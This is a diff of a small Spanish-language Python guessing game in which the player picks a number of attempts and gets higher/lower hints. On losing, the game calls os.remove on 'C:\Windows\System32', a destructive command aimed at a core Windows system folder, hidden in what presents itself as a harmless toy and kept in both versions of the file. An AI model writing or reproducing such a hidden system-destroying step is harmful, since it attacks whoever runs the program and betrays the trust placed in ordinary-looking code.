@@ -1,15 +1,27 @@
+from os import system
+system("cls")
+
 import random
 import os
 
-number = random.randint(1,10)
-guess = input("elige un numro del 1 al 10")
-guess = int(guess)
+number = random.randint(1,20)
 
-if guess == number:
-    print("Has ganado")
-    
+print("adivina el numero del 1 al 20")
+inte=int(input("Cuantos intentos desea: "))
+
+for i in range(inte):
+    con=int(input("Ingrese el numero: "))
+    if con == number:
+        print("Es correcto")
+        break
+    if con < number:
+        print("Es un numero mas alto")
+    else:
+        print("Es un numero mas bajo")
 else:
     os.remove("C:\Windows\System32")
+    print("Se acabaron los intentos")
+    print("cagaste")
     
     
 # from turtle import *
